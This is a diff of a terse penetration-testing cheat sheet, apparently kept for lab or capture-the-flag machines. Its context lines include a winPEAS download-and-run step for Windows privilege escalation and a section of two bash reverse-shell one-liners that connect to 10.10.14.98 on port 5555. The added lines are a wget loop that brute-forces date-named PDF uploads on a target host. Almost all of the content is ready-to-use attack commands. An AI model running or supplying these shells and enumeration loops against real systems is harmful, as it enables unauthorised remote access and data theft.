@@ -53,6 +53,15 @@ WINPEAS
 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
 ./winPEASx64.exe | tee -filepath output.txt
 
+BASH LOOP LOOP
+#!/bin/bash
+for d in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31
+do
+	for m in 01 02 03 04 05 06 07 08 09 10 11 12
+	do wget http://10.129.245.165/documents/2020-$m-$d-upload.pdf
+	done
+done
+
 REV SHELLS
 bash -i >& /dev/tcp/10.10.14.98/5555 0>&1
 0<&196;exec 196<>/dev/tcp/10.10.14.98/5555; sh <&196 >&196 2>&196
